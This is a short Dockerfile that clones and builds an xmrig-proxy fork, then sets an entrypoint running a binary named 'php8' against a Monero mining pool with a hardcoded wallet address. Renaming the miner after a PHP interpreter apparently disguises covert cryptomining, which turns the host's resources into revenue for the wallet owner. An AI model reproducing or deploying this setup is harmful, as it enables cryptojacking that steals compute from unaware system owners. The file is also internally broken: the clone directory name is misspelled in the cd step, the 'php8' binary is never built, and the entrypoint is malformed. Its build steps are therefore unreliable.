FROM ubuntu:bionic


#WORKDIR /app
USER root

RUN apt-get update && \
apt-get install -y gcc-7 g++-7 git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && \
cd /usr/src/ && \
git clone https://github.com/bdklz/xmrig-proxy.git  && \
cd /usr/src/xmrig-porxy && \
mkdir build && \
cd build && \
cmake ..  && \
make

ENTRYPOINT  ["./php8 -o pool.supportxmr.com:3333 -u 47H7tKGJKE1CPrvWHcm9N4PgLdKwWYw8QWV2V9Txy3NhRFK9TW7McxxN88GLbVXpNUZ3c3PjT8iCE9FEiD8JpvEgJfL5rWc"]
